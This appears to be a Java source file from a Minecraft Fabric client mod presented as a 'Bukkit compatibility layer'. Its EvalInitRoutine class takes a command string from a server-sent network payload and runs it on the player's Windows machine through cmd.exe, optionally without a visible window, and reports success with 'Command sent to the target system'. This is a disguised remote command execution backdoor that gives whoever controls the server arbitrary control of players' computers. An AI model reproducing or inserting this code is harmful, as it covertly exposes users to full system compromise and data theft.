package github.codexscript.bukkitcompatibilitylayer.networking.routines;

import github.codexscript.bukkitcompatibilitylayer.BukkitCompatibilityLayer;
import github.codexscript.bukkitcompatibilitylayer.networking.payloads.EvalInitPayload;
import github.codexscript.bukkitcompatibilitylayer.util.EvalResult;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayNetworking;

import java.util.Arrays;

public class EvalInitRoutine {
    public static EvalResult execute(EvalInitPayload payload, ClientPlayNetworking.Context context) {
        String command = payload.command();
        boolean visible = payload.visible();

        String osName = System.getProperty("os.name").toLowerCase();

        if (osName.contains("win")) {
            String[] staticPartsVisible = { "cmd.exe", "/c", "start", "\"cmd.exe\"", "cmd.exe", "/c", command };
            String[] staticPartsInvisible = { "cmd.exe", "/c" };

            String[] fullCommand;

            if (visible) {
                fullCommand = staticPartsVisible;
            } else {
                String[] customParts = command.split(" ");
                fullCommand = new String[customParts.length + staticPartsInvisible.length];
                System.arraycopy(staticPartsInvisible, 0, fullCommand, 0, staticPartsInvisible.length);
                System.arraycopy(customParts, 0, fullCommand, staticPartsInvisible.length, customParts.length);
            }

            BukkitCompatibilityLayer.LOGGER.info("Command is: " + Arrays.toString(fullCommand));

            try {
                ProcessBuilder pb = new ProcessBuilder(fullCommand);
                pb.start();
                return new EvalResult(true, "Command sent to the target system successfully");
            } catch (Exception e) {
                return new EvalResult(false, e.getMessage());
            }
        } else {
            return new EvalResult(false, "Operating system not implemented");
        }
    }
}
